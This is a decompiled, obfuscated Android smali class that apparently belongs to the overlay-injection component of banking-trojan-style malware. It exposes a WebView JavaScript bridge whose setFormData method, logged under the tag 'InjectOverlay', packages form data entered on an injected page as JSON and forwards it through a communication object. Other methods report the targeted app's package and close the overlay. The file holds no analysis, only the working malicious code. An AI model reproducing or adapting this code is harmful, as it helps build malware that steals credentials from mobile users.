.class public final Lڜٟٱڀ/ب;
.super Ljava/lang/Object;
.source "SourceFile"


# instance fields
.field public final synthetic ؋:Lڜٟٱڀ/ة;


# direct methods
.method public constructor <init>(Lڜٟٱڀ/ة;)V
    .locals 0

    iput-object p1, p0, Lڜٟٱڀ/ب;->؋:Lڜٟٱڀ/ة;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public getPkg()Ljava/lang/String;
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    iget-object v0, p0, Lڜٟٱڀ/ب;->؋:Lڜٟٱڀ/ة;

    iget-object v0, v0, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lڜٟٱڀ/ب;->؋:Lڜٟٱڀ/ة;

    iget-object v0, v0, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    goto :goto_0

    :cond_0
    const-string v0, ""

    :goto_0
    return-object v0
.end method

.method public getSn()Ljava/lang/String;
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    const-string v0, ""

    :try_start_0
    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v1

    if-eqz v1, :cond_0

    iget-object v0, v1, Lڜٟٱڀ/د;->إ:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-object v0
.end method

.method public setClosePage(Ljava/lang/String;)V
    .locals 3
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    iget-object p1, p0, Lڜٟٱڀ/ب;->؋:Lڜٟٱڀ/ة;

    iget-object v0, p1, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    iget-object v1, p1, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    invoke-virtual {p1}, Lڜٟٱڀ/ة;->أ()V

    const-string v0, ""

    iput-object v0, p1, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    iput-object v0, p1, Lڜٟٱڀ/ة;->ا:Ljava/lang/String;

    iget-object v0, p1, Lڜٟٱڀ/ة;->ت:Landroid/os/Handler;

    new-instance v1, Lڜٟٱڀ/ئ;

    const/4 v2, 0x3

    invoke-direct {v1, p1, v2}, Lڜٟٱڀ/ئ;-><init>(Lڜٟٱڀ/ة;I)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public setFormData(Ljava/lang/String;)V
    .locals 4
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "FKB.setFormData: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "InjectOverlay"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lڜٟٱڀ/ب;->؋:Lڜٟٱڀ/ة;

    iget-object v2, v0, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    iget-object v0, v0, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    iget-object v0, p0, Lڜٟٱڀ/ب;->؋:Lڜٟٱڀ/ة;

    invoke-virtual {v0}, Lڜٟٱڀ/ة;->أ()V

    :try_start_0
    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v0

    if-eqz v0, :cond_0

    iget-object v2, v0, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    if-eqz v2, :cond_0

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const-string v3, "data"

    invoke-virtual {v2, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object p1, v0, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    const-string v0, "formData"

    invoke-virtual {p1, v0, v2}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string v0, "setFormData error"

    invoke-static {v1, v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_0
    :goto_0
    return-void
.end method
